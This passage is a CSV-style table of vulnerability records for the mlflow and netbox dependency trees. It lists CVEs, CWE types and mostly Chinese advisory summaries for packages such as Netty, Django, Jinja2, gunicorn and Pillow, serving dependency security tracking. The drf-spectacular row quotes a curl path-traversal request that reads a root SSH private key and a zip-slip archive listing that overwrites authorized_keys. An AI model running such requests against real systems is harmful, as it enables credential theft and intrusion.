mlflow_mlflow,zookeeper,3.6.3,False,CVE-2023-44981,CWE-639,2023-10-11,"Apache Zookeeper是美国阿帕奇（Apache）基金会的一个软件项目，它能够为大型分布式计算提供开源的分布式配置服务、同步服务和命名注册等功能。
Apache ZooKeeper 3.9.1之前、3.8.3之前、3.7.2之前版本存在安全漏洞，该漏洞源于如果在 ZooKeeper 中启用了 SASL Quorum Peer 身份验证 (quorum.auth.enableSasl=true)，则通过验证 SASL 身份验证 ID 中的实例部分会在 Zoo 中列出来，SASL 身份验证 ID 中的实例部分是可选的。",1,2
mlflow_mlflow,commons-compress,1.23.0,False,CVE-2023-42503,CWE-20 CWE-400,2023-09-14,CVE-2023-42503 是 Apache Commons Compress 中的一个漏洞，该漏洞源于 TAR 文件解析时的不当输入验证和不受控制的资源消耗问题。攻击者可以通过创建一个修改了文件修改时间头部的恶意 TAR 文件来利用该漏洞。当使用 Apache Commons Compress 解析该 TAR 文件时，会因 CPU 资源消耗而导致拒绝服务。,3,0
mlflow_mlflow,commons-compress,1.23.0,False,CVE-2024-26308,CWE-770,2024-02-19,在Apache Commons Compress库中，版本1.21至1.25存在资源分配无限制或限制不足漏洞（CVE-2024-26308）。此漏洞是由于未正确分配资源所致，可能导致内存和CPU资源被过度消耗。如果攻击者提供特制的输入数据，可能导致系统过载并发生拒绝服务（DoS）攻击。,3,0
mlflow_mlflow,commons-compress,1.23.0,False,CVE-2024-25710,CWE-835,2024-02-19,在 Apache Commons Compress 版本1.3到1.25.0中存在一个无限循环漏洞。当处理一个损坏的DUMP文件时，程序会进入一个不可退出的循环，导致应用程序挂起或崩溃。,2,0
mlflow_mlflow,commons-lang3,3.12.0,False,CVE-2025-48924,CWE-674,2025-07-11,Apache Commons Lang 是一个用于提供对 Java 基础类操作的通用工具库。该库中的 ClassUtils.getClass(...) 方法在处理非常长的输入时会因递归调用过深导致 StackOverflowError。递归深度没有得到有效控制，可能导致系统堆栈溢出，这是由于输入深度未被正确限制。目前影响版本包括从 commons-lang:commons-lang 2.0 到 2.6，以及 org.apache.commons:commons-lang3 3.0 到 3.18.0 之前的版本。此错误通常不被应用程序和库捕获处理，从而可能导致应用程序停止服务。,2,2
mlflow_mlflow,commons-io,2.5,False,CVE-2024-47554,CWE-400,2024-10-03,"Apache Commons IO是美国阿帕奇（Apache）基金会的一个应用程序。提供一个帮助开发IO功能。
Apache Commons IO 2.0版本至2.14.0之前版本存在资源管理错误漏洞，该漏洞源于CPU资源消耗不受控制。",3,0
mlflow_mlflow,snappy-java,1.1.10.3,False,CVE-2023-43642,CWE-770,2023-09-25,"Snappy是KNP Labs个人开发者的一个 PHP 库，允许从 url 或 html 页面生成缩略图、快照或 PDF。
Snappy 1.1.10.3及之前版本存在安全漏洞，该漏洞源于SnappyInputStream缺少对块长度的上限检查，导致解压过大的数据时容易受到拒绝服务（DoS）攻击。",2,2
mlflow_mlflow,netty-codec-http,4.1.96.Final,False,CVE-2024-29025,CWE-770,2024-03-25,"Netty是Netty社区的一款非阻塞I/O客户端-服务器框架，它主要用于开发Java网络应用程序，如协议服务器和客户端等。
Netty 4.1.108.Final之前版本存在安全漏洞，该漏洞源于“HttpPostRequestDecoder”被用来积累数据。",3,2
mlflow_mlflow,netty-codec-http,4.1.96.Final,False,CVE-2025-58056,CWE-444,2025-09-03,Netty 是一个异步事件驱动的网络应用程序框架，主要用于开发可维护的高性能协议服务器和客户端。在版本 4.1.124.Final 和 4.2.0.Alpha3 至 4.2.4.Final 中，Netty 在解析 HTTP/1.1 消息的分块编码时存在缺陷：它错误地接受了单独的换行符 (LF) 作为块大小行的终止符，而不是严格要求的 CRLF（回车和换行符组合），这违反了 HTTP/1.1 标准。当 Netty 部署在某些解析 LF 不同的反向代理后端时，攻击者可以构造特定请求，使代理认为这是一个请求，但 Netty 会将其解析为两个请求，从而实现请求走私攻击。该缺陷已在版本 4.1.125.Final 和 4.2.5.Final 中修复。,4,2
mlflow_mlflow,netty-codec-http2,4.1.96.Final,False,,CWE-400,2023-10-11,"A client might overload the server by issue frequent RST frames. This can cause a massive amount of load on the remote system and so cause a DDOS attack. 

### Impact
This is a DDOS attack, any http2 server is affected and so you should update as soon as possible.

### Patches
This is patched in version 4.1.100.Final.

### Workarounds
A user can limit the amount of RST frames that are accepted per connection over a timeframe manually using either an own `Http2FrameListener` implementation or an `ChannelInboundHandler` implementation (depending which http2 API is used).

### References
- https://www.cve.org/CVERecord?id=CVE-2023-44487
- https://blog.cloudflare.com/technical-breakdown-http2-rapid-reset-ddos-attack/
- https://cloud.google.com/blog/products/identity-security/google-cloud-mitigated-largest-ddos-attack-peaking-above-398-million-rps/",2,2
mlflow_mlflow,netty-codec-http2,4.1.96.Final,False,CVE-2025-55163,CWE-770,2025-08-13,"Netty是Netty社区的一款非阻塞I/O客户端-服务器框架，它主要用于开发Java网络应用程序，如协议服务器和客户端等。
Netty 4.1.124.Final和4.2.4.Final之前版本存在安全漏洞，该漏洞源于HTTP/2协议逻辑缺陷，可能导致资源耗尽和分布式拒绝服务攻击。",2,2
mlflow_mlflow,netty-common,4.1.96.Final,False,CVE-2024-47535,CWE-400,2024-11-12,Netty 是由 Netty 社区开发的高性能、异步事件驱动的 Java 网络应用框架，常用于创建协议服务器和客户端等网络应用。在 Netty 的 4.1.114 及之前的版本中，存在一个资源管理错误漏洞。此漏洞的根本原因在于框架未能安全地读取环境文件，可能导致环境变量中的敏感信息泄露，影响到应用程序的机密性。,3,0
mlflow_mlflow,netty-common,4.1.96.Final,False,CVE-2025-25193,CWE-400,2025-02-10,"Netty是Netty社区的一款非阻塞I/O客户端-服务器框架，它主要用于开发Java网络应用程序，如协议服务器和客户端等。
Netty 4.1.118.Final及之前版本存在资源管理错误漏洞，该漏洞源于Windows环境下对不存在的大文件读取未正确处理，可能引发拒绝服务。",3,0
mlflow_mlflow,netty-handler,4.1.96.Final,False,CVE-2023-4586,CWE-20 CWE-295,2020-01-10,<p>Hot Rod Client是由Netty框架使用的组件，通常用于处理跨节点的通信。此漏洞源于当TLS加密被使用时，Hot Rod Client未正确验证主机名（CWE-295）。这种不当的证书验证可能允许攻击者进行中间人（MITM）攻击，冒充合法服务器与客户端进行通信，从而拦截或篡改数据。受影响的系统包括多个依赖Netty的应用程序，如IBM Event Streams和Process Mining。</p><p>注意：官方以不承认该漏洞，请结合实际业务分析确认是否值得修复。</p>,2,0
mlflow_mlflow,netty-handler,4.1.96.Final,False,CVE-2025-24970,CWE-20,2025-02-10,"Netty是Netty社区的一款非阻塞I/O客户端-服务器框架，它主要用于开发Java网络应用程序，如协议服务器和客户端等。
Netty 4.1.91.Final版本至4.1.118.Final之前版本存在输入验证错误漏洞，该漏洞源于SslHandler对特定恶意数据包的验证缺陷，导致原生崩溃。",2,2
mlflow_mlflow,ivy,2.5.1,False,CVE-2022-46751,CWE-91 CWE-611,2023-08-21,<p>Apache Ivy 是一个用于简化基于Java的项目依赖管理的工具。它在处理XML文件时，例如其自身的配置文件、Ivy文件或Maven POM文件，存在不当限制外部实体引用的漏洞。这个漏洞会允许下载和扩展任何包含在XML中的外部文档类型定义（DTDs），从而可能导致敏感信息泄露和未经授权的资源访问。</p>,2,0
mlflow_mlflow,janino,3.1.9,False,CVE-2023-33546,CWE-787,2023-06-01,Janino 是一个轻量级的 Java 编译器库，通常用于动态表达式评估和 Java 源代码编译。该库的 3.1.9 及更早版本在其 `evaluator.guessParameterName()` 方法中存在输入验证不足的问题。攻击者可以通过构造恶意输入，导致栈溢出（stack overflow），从而使解析器崩溃，导致拒绝服务（DoS）。特别是，当系统处理不可信输入时，该漏洞的风险会显著增加。,3,0
mlflow_mlflow,junit,4.12,True,CVE-2020-15250,CWE-200 CWE-732,2020-10-12,JUnit4的测试规则TemporaryFolder中存在一个本地信息泄露漏洞。在Unix类系统中，系统的临时目录在所有用户之间是共享的。因此，当文件和目录被写入此目录时，默认情况下，该系统上的其他用户可以读取它们。此漏洞不允许其他用户覆盖这些目录或文件的内容。这只是一个纯粹的信息泄露漏洞。如果你在JUnit测试中写入敏感信息，如API密钥或密码，到临时文件夹中，并且JUnit测试在一个有其他不受信任用户的操作系统环境中执行，那么此漏洞将影响你。,3,0
netbox-community_netbox,Django,5.2.*,True,CVE-2025-57833,CWE-89,2025-09-03,<p>Django 是一个流行的 Python Web 开发框架，提供了高效的 ORM（对象关系映射）功能以简化数据库操作。FilteredRelation 是 Django ORM 中的一种功能，用于在查询中定义过滤关联关系。此漏洞（CVE-2025-57833）涉及 FilteredRelation 的列别名处理，因未对输入的列别名进行充分验证而导致攻击者能够通过构造恶意输入绕过列别名的安全校验，从而实现 SQL 注入攻击。攻击者可以利用该漏洞，通过在 QuerySet.annotate() 或 QuerySet.alias() 方法中传递特制的字典（通过 **kwargs 进行字典展开），插入任意 SQL 命令。此漏洞影响 Django 4.2.24 之前版本、5.1.12 之前版本和 5.2.6 之前版本。</p>,2,2
netbox-community_netbox,Django,5.2.*,True,CVE-2025-48432,CWE-117,2025-06-05,<p>Django 是一个流行的基于 Python 的 Web 应用框架，提供快捷方便的开发方式和整洁的设计准则。此漏洞存在于 Django 版本 5.2（早于 5.2.2）、5.1（早于 5.1.10）和 4.2（早于 4.2.22）中。其原因是内部 HTTP 响应日志记录未对 request.path 进行必要的转义，从而允许远程攻击者通过精心设计的 URL 来操纵日志输出。当日志在终端中查看或由外部系统处理时，可能导致日志注入或伪造。</p>,3,2
netbox-community_netbox,Django,5.2.*,True,CVE-2025-59682,CWE-23,2025-10-01,Django 是一个广泛使用的 Python Web 开发框架，提供了一系列工具用于快速构建安全且可扩展的 Web 应用程序。其中，django.utils.archive.extract() 函数用于处理归档文件解压操作，并被 'startapp --template' 和 'startproject --template' 命令使用。在 Django 版本 4.2（低于 4.2.25）、5.1（低于 5.1.13）以及 5.2（低于 5.2.7）中，该函数存在一个目录遍历漏洞。攻击者可以通过构造含有共享前缀路径的归档文件，绕过目标目录限制，从而写入或修改目标目录外的文件。漏洞的根本原因在于对归档文件的路径验证不严，未能正确过滤和限制路径。,2,0
netbox-community_netbox,Django,5.2.*,True,CVE-2025-59681,CWE-89,2025-10-01,Django 是一个流行的 Python Web 框架，主要用于快速开发 Web 应用和服务。其核心组件 QuerySet 提供了强大的查询构造功能。漏洞涉及 Django 版本 4.2（低于 4.2.25）、5.1（低于 5.1.13）和 5.2（低于 5.2.7）。在使用 QuerySet 的 annotate()、alias()、aggregate() 和 extra() 方法时，如果传递了精心构造的字典参数（通过字典展开 **kwargs），在 MySQL 和 MariaDB 数据库中可能导致 SQL 注入。这是因为这些方法未对列别名进行充分的校验，从而允许恶意用户通过构造字段名称或别名注入恶意 SQL。,3,0
netbox-community_netbox,Django,5.2.*,True,CVE-2025-32873,CWE-770,2025-05-08,Django是一个用于快速开发Web应用的高层次Python框架。该框架中的django.utils.html.strip_tags()函数在处理包含大量不完整HTML标签的输入时可能导致性能下降，从而引发拒绝服务问题。,3,2
netbox-community_netbox,Django,5.2.*,True,CVE-2025-64458,CWE-407,2025-11-05,Django 是一个流行的 Python Web 框架，广泛用于开发高效和可扩展的 Web 应用程序。这一漏洞主要影响 Django 框架的 5.1 版本（低于 5.1.14）、4.2 版本（低于 4.2.26）和 5.2 版本（低于 5.2.8）。漏洞的根本原因是 Windows 平台上 Python 的 NFKC 字符归一化功能在处理大量 Unicode 字符时性能较差，导致 `django.http.HttpResponseRedirect`、`django.http.HttpResponsePermanentRedirect` 和 `django.shortcuts.redirect` 方法可能因处理特定构造的输入而受到拒绝服务攻击的影响。攻击者可以利用包含大量 Unicode 字符的输入消耗服务器资源，从而导致服务中断。另外，早期不受支持的 Django 版本（如 5.0.x、4.1.x 和 3.2.x）也可能受到此问题的影响，但尚未经过系统评估。,2,2
netbox-community_netbox,django-cors-headers,,True,,CWE-20,2020-04-01,"## Overview
[django-cors-headers](https://github.com/adamchainz/django-cors-headers) is a Django app for handling the server headers required for Cross-Origin Resource Sharing (CORS)

Affected versions of this package are vulnerable to Improper Validation. CORS middleware allows requests between schemes provided by a `CORS_ORIGIN_WHITELIST `, and it is possible to allow insecure schemas such as `http`. This is remediated in the fixed version.
## Remediation
Upgrade `django-cors-headers` to version 3.0.0 or higher.
## References
- [GitHub Changelog](https://github.com/adamchainz/django-cors-headers/blob/master/HISTORY.rst#300-2019-05-10)
",4,0
netbox-community_netbox,django-debug-toolbar,,True,CVE-2021-30459,CWE-89,2021-04-14,"Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。
Django Debug Toolbar 存在SQL注入漏洞，攻击者可利用该漏洞通过更改SQL explain、analyze或select表单的原始SQL输入字段来执行SQL语句。",2,2
netbox-community_netbox,django-filter,,True,CVE-2020-15225,CWE-681,2020-09-29,"Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。
Django-filter 2.4.0之前版本存在安全漏洞，该漏洞源于受到恶意输入的DoS的影响。",2,2
netbox-community_netbox,django-storages,,True,,CWE-453,2018-10-09,"## Overview
[django-storages](https://pypi.org/project/django-storages/) is a project to provide a variety of storage backends in a single library.

Affected versions of this package are vulnerable due to an Insecure Default behavior of `S3BotoStorage`.

## Remediation
Upgrade `django-storages` to version 1.7 or higher.

## References
- [GitHub Commit](https://github.com/jschneier/django-storages/commit/6ee6a739752923c60eaa1e82262c1d07208ec7f6)
",3,0
netbox-community_netbox,drf-spectacular,,True,,CWE-22,2023-07-07,"## Overview
[drf-spectacular](https://pypi.org/project/drf-spectacular) is a Sane and flexible OpenAPI 3 schema generation for Django REST framework

Affected versions of this package are vulnerable to Directory Traversal due to improper user-input sanitization in the `drf_spectacular/plumbing.py` file.

## Details

A Directory Traversal attack (also known as path traversal) aims to access files and directories that are stored outside the intended folder. By manipulating files with ""dot-dot-slash (../)"" sequences and its variations, or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and other critical system files.

Directory Traversal vulnerabilities can be generally divided into two types:

- **Information Disclosure**: Allows the attacker to gain information about the folder structure or read the contents of sensitive files on the system.

`st` is a module for serving static files on web pages, and contains a [vulnerability of this type](https://snyk.io/vuln/npm:st:20140206). In our example, we will serve files from the `public` route.

If an attacker requests the following URL from our server, it will in turn leak the sensitive private key of the root user.

```
curl http://localhost:8080/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa
```
**Note** `%2e` is the URL encoded version of `.` (dot).

- **Writing arbitrary files**: Allows the attacker to create or replace existing files. This type of vulnerability is also known as `Zip-Slip`. 

One way to achieve this is by using a malicious `zip` archive that holds path traversal filenames. When each filename in the zip archive gets concatenated to the target extraction folder, without validation, the final path ends up outside of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.

The following is an example of a `zip` archive with one benign file and one malicious file. Extracting the malicious file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:

```
2018-04-15 22:04:29 .....           19           19  good.txt
2018-04-15 22:04:42 .....           20           20  ../../../../../../root/.ssh/authorized_keys
```

## Remediation
Upgrade `drf-spectacular` to version 0.9.4 or higher.
## References
- [GitHub Commit](https://github.com/tfranzel/drf-spectacular/commit/7e77bb3ea852f407f1780c8ae6b5b17a9c8b8520)
",2,2
netbox-community_netbox,feedparser,,True,CVE-2011-1156,CWE-399,2011-04-11,Universal Feed Parser(又名feedparser或者python-feedparser）5.0.1之前版本中的feedparser.py中存在资源管理错误漏洞。在解析某些HTML / DOCTYPE组合时产生的错误，可引起异常反应，远程攻击者可以借助畸形DOCTYPE声明导致拒绝服务，解析器崩溃。,2,2
netbox-community_netbox,feedparser,,True,CVE-2009-5065,CWE-79,2011-04-11,Universal Feed Parser(又名feedparser或者python-feedparser）5.0之前版本中的feedparser.py中存在跨站脚本攻击漏洞。远程攻击者可以借助与嵌入CDATA节有关的向量，注入任意web脚本或者HTML。,3,1
netbox-community_netbox,feedparser,,True,CVE-2011-1157,CWE-79,2011-04-11,Universal Feed Parser(又名feedparser或者python-feedparser）5.0.1之前版本中的feedparser.py中存在跨站脚本攻击漏洞。 由于某些XML注释的输入在使用之前没有经过正确过滤，当浏览恶意数据时，远程攻击者可以借助该漏洞在受影响站点的用户浏览器会话中注入任意web脚本或者HTML。,3,0
netbox-community_netbox,feedparser,,True,CVE-2011-1158,CWE-79,2011-04-11,Universal Feed Parser(又名feedparser或者python-feedparser）5.0.1之前版本的feedparser.py中存在跨站脚本攻击漏洞。由于某些URI schemes的输入在使用之前没有经过正确过滤，当浏览恶意数据时，远程攻击者可利用此漏洞在受影响站点的用户浏览器会话中注入任意HTML及脚本代码。,3,0
netbox-community_netbox,feedparser,,True,CVE-2012-2921,CWE-399,2012-05-21,Universal Feed Parser（也称feedparser或者 python-feedparser）5.1.2之前版本中存在漏洞。远程攻击者可利用该漏洞借助特制非ASCII编码文档的XML ENTITY声明导致拒绝服务（内存消耗）。,2,2
netbox-community_netbox,gunicorn,,True,,CWE-20,2021-04-02,"## Overview
[gunicorn](http://gunicorn.org/) is a Python WSGI HTTP Server for UNIX

Affected versions of this package are vulnerable to Improper Input Validation. Gunicorn fails with a 500, instead of a 400, when a request path is a malformed IPv6 address. This is due to no raise 'InvalidRequestLine' exception when the line contains malicious data.
## Remediation
Upgrade `gunicorn` to version 19.4.0 or higher.
## References
- [GitHub Commit](https://github.com/benoitc/gunicorn/commit/b951175c66c353d10127a20a62f61e834829856c)
- [GitHub Issue](https://github.com/benoitc/gunicorn/issues/1023)
",4,0
netbox-community_netbox,gunicorn,,True,,CWE-444,2020-01-09,"## Overview
[gunicorn](http://gunicorn.org/) is a Python WSGI HTTP Server for UNIX

Affected versions of this package are vulnerable to HTTP Request Smuggling. It fails to properly process the `Transfer-Encoding` and `Content-Length` headers when both are present in a package request. This allows for conflicting information to be sent regarding the length of the package, which when processed by back-end servers under certain configurations would allow for malicious users to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users.
## Remediation
Upgrade `gunicorn` to version 19.10.0, 20.0.1 or higher.
## References
- [GitHub Commit](https://github.com/benoitc/gunicorn/commit/c5be1bae5c42b1e600be22d0655fc3ec4e4711cb)
- [GitHub Issue](https://github.com/benoitc/gunicorn/issues/2176)
- [GitHub PR](https://github.com/benoitc/gunicorn/pull/2181)
- [Gunicorn ChangeLog](https://docs.gunicorn.org/en/stable/news.html#id1)
- [HTTP Request Smuggling Security Blog](https://portswigger.net/web-security/request-smuggling)
",3,0
netbox-community_netbox,gunicorn,,True,CVE-2018-1000164,CWE-93,2018-04-18,"gunicorn是一款基于UNIX平台的Python WSGI HTTP服务器软件。

gunicorn 19.4.5版本中的nicorn/http/wsgi.py文件的‘process_headers’函数存在安全漏洞。攻击者可利用该漏洞造成服务器返回任意的HTTP包头。",2,2
netbox-community_netbox,gunicorn,,True,CVE-2024-1135,CWE-444,,Gunicorn是一个开源的Python WSGI HTTP服务器，旨在处理网络请求并提供高性能的Web服务。该组件存在HTTP请求走私漏洞，原因在于对`Transfer-Encoding`标头的验证不当，攻击者可以通过构造包含相互冲突的`Transfer-Encoding`标头的请求，从而绕过安全限制，访问受限的端点。此漏洞的触发条件是用户的网络路径未能过滤无效请求。,2,1
netbox-community_netbox,gunicorn,,True,CVE-2024-6827,CWE-444,,Gunicorn是一个开源的Python Web服务器网关接口（WSGI）HTTP服务器。Gunicorn版本21.2.0未能正确验证'Transfer-Encoding'头的值，导致在RFC标准中规定的默认回退方法为'Content-Length'，使其易受TE.CL请求夹带攻击。攻击者可以通过构造特定的HTTP请求来利用此漏洞，造成缓存中毒、数据泄露、会话操纵、SSRF、XSS、DoS、数据完整性损害、安全绕过、信息泄漏和业务逻辑滥用等问题。,2,1
netbox-community_netbox,Jinja2,,True,CVE-2014-0012,CWE-264,2014-01-18,"Jinja2是一款基于Python的模板引擎。该产品具有完整的Unicode支持，并提供了可选的沙箱模板执行环境。
Jinja2 2.7.2版本存在权限许可和访问控制问题漏洞，该漏洞源于程序没有正确创建临时目录。本地攻击者可通利用该漏洞以用户的UID提前创建临时目录，获取特权。",3,0
netbox-community_netbox,Jinja2,,True,CVE-2020-28493,CWE-400,2021-02-01,"Jinja2是一款基于Python的模板引擎。该产品具有完整的Unicode支持，并提供了可选的沙箱模板执行环境。
jinja2 from 0.0.0 and before 2.11.3 存在资源管理错误漏洞，该漏洞源于regex的ReDOS漏洞。",3,2
netbox-community_netbox,Jinja2,,True,CVE-2016-10745,CWE-134,2019-04-08,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Pallets Jinja中存在格式化字符串错误漏洞。该漏洞源于网络系统或产品接收外部格式化字符串作为参数时，对参数类型、数量等过滤不严格。以下产品及版本受到影响：Pallets Jinja 2.8.1之前版本。",2,2
netbox-community_netbox,Jinja2,,True,CVE-2019-10906,CWE-693,2019-04-06,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Pallets Jinja 2.10.1之前版本中存在权限许可和访问控制问题漏洞。攻击者可利用该漏洞绕过沙盒保护。",2,2
netbox-community_netbox,Jinja2,,True,CVE-2024-22195,CWE-79,2024-01-11,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Jinja 3.1.3之前版本存在安全漏洞，该漏洞源于存在跨站脚本（XSS）漏洞。",3,0
netbox-community_netbox,Jinja2,,True,CVE-2014-1402,CWE-264,2014-01-10,"Jinja2是一个基于Python的模板引擎，它拥有完整的unicode支持，并且提供了可选的沙箱模板执行环境来保证安全。
Jinja2 2.7.1及之前版本的bccache.FileSystemBytecodeCache中的默认配置存在安全漏洞，该漏洞源于程序没有正确创建临时文件。本地攻击者可借助/tmp目录下特制的cache文件利用该漏洞获取特权。",2,0
netbox-community_netbox,Jinja2,,True,CVE-2024-34064,CWE-79,2024-05-06,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Pallets Jinja 3.1.4之前版本存在安全漏洞，该漏洞源于将用户输入作为键传递给 xmlattr 过滤器时，Jinja 容易受到 HTML 属性注入。",3,0
netbox-community_netbox,Jinja2,,True,CVE-2024-56326,CWE-693 CWE-1336,2024-12-23,Jinja 是由 Pallets 开源的一个快速、富有表现力并可扩展的模板引擎。该漏洞存在于 Jinja 版本 3.1.5 之前，由于在沙箱环境中对 str.format 调用的检测存在不当，攻击者可以控制模板的内容并执行任意 Python 代码。攻击者可以通过创建包含恶意字符串的模板并利用自定义过滤器实现攻击，这可能导致系统安全性严重受损。,3,0
netbox-community_netbox,Jinja2,,True,CVE-2024-56201,CWE-150,2024-12-23,Jinja是Pallets开源的一个快速、富有表现力且可扩展的模板引擎。版本3.1.5之前的Jinja存在安全漏洞，该漏洞源于编译器的一个错误，允许同时控制模板内容和文件名的攻击者执行任意Python代码，无论Jinja的沙箱是否被使用。当应用程序执行不可信的模板时，攻击者需要能够控制模板的文件名和内容，才能有效利用此漏洞。,3,0
netbox-community_netbox,Jinja2,,True,CVE-2025-27516,CWE-1336,2025-03-05,Jinja2 是一个广泛用于Web应用程序的模板引擎，用于渲染模板。该漏洞源于 Jinja2 沙盒环境与 `|attr` 过滤器交互时的一个疏忽。特别是，当攻击者能够控制模板的内容时，就可以利用此缺陷执行任意 Python 代码。这意味着，如果某个应用程序处理不可信的模板，就可能受到威胁，从而导致未经授权的系统访问或操作。,3,2
netbox-community_netbox,Pillow,,True,,,2023-10-05,"## Duplicate Advisory
This advisory has been withdrawn because it is a duplicate of GHSA-56pw-mpj4-fxww. This link is maintained to preserve external references.

## Original Description
Pillow versions before v10.0.1 bundled libwebp binaries in wheels that are vulnerable to CVE-2023-5129 (previously CVE-2023-4863). Pillow v10.0.1 upgrades the bundled libwebp binary to v1.3.2.",2,-2
netbox-community_netbox,Pillow,,True,,CWE-400,2021-04-24,"### Impact
_Pillow before 8.1.1 allows attackers to cause a denial of service (memory consumption) because the reported size of a contained image is not properly checked for a BLP container, and thus an attempted memory allocation can be very large._

### Patches
_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._

### Workarounds
_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._

### References
https://nvd.nist.gov/vuln/detail/CVE-2021-27921

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [example link to repo](http://example.com)
* Email us at [example email address](mailto:example@example.com)",2,2
netbox-community_netbox,Pillow,,True,,CWE-400,2022-03-12,"JpegImagePlugin may append an EOF marker to the end of a truncated file, so that the last segment of the data will still be processed by the decoder.

If the EOF marker is not detected as such however, this could lead to an infinite loop where JpegImagePlugin keeps trying to end the file.",4,-2
netbox-community_netbox,Pillow,,True,CVE-2022-45198,CWE-409,2022-11-14,"Pillow是一款基于Python的图像处理库。
Pillow 9.2.0之前版本存在安全漏洞，该漏洞源于对高度压缩的GIF数据处理不当。",2,2
netbox-community_netbox,Pillow,,True,CVE-2020-10994,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/Jpeg2KDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
netbox-community_netbox,Pillow,,True,CVE-2016-4009,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本的libImaging/Resample.c文件中的‘ImagingResampleHorizontal’函数存在整数溢出漏洞。远程攻击者可借助负的‘new’的大小值利用该漏洞造成拒绝服务（基于堆的缓冲区溢出）。",1,2
netbox-community_netbox,Pillow,,True,CVE-2020-11538,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.0.0及之前版本中的libImaging/SgiRleDecode.c文件的SGI图像文件的处理存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",1,0
netbox-community_netbox,Pillow,,True,CVE-2021-27923,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
netbox-community_netbox,Pillow,,True,CVE-2021-27922,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
netbox-community_netbox,Pillow,,True,CVE-2021-27921,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
netbox-community_netbox,Pillow,,True,CVE-2021-25290,CWE-787,2021-03-11,<p>Pillow是一款基于Python的图像处理库。 Pillow 8.1.1之前版本存在安全漏洞。该漏洞源于在TiffDecode.c中存在一个大小无效的负偏移memcpy。</p>,2,2
netbox-community_netbox,Pillow,,True,CVE-2021-25293,CWE-125,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1版本之前存在安全漏洞。该漏洞源于SGIRleDecode.c中存在越界读取。",2,2
netbox-community_netbox,Pillow,,True,CVE-2021-25291,CWE-125,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1之前版本中存在安全漏洞。该漏洞源于TiffDecode.c在TiffreadRGBATile中通过无效的title越界读取。",2,2
netbox-community_netbox,Pillow,,True,CVE-2020-35653,CWE-125,2021-01-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.0之前版本中存在缓冲区错误漏洞，当解码一个精心制作的PCX文件时，PoxDecode有一个缓冲区过读，因为缓冲区计算信任用户提供的stride值。",2,0
netbox-community_netbox,Pillow,,True,,CWE-78,2020-11-02,"## Overview
[Pillow](https://python-pillow.org/) is a PIL (Python Imaging Library) fork.

Affected versions of this package are vulnerable to Command Injection in filenames that contain single quotes via `load_djpeg`.
## Remediation
Upgrade `Pillow` to version 2.5.0 or higher.
## References
- [GitHub PR](https://github.com/python-pillow/Pillow/pull/748)
- [Pillow Changelog](https://github.com/python-pillow/Pillow/blob/master/CHANGES.rst#250-2014-07-01)
",1,0
netbox-community_netbox,Pillow,,True,CVE-2020-10378,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/PcxDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
netbox-community_netbox,Pillow,,True,CVE-2020-10177,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/FliDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
netbox-community_netbox,Pillow,,True,CVE-2020-5312,CWE-120,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/PcxDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制PCX文件利用该漏洞在系统上执行任意代码。",1,2
netbox-community_netbox,Pillow,,True,CVE-2020-5311,CWE-120,2020-01-02,"Pillow是一款基于Python的图像处理库。
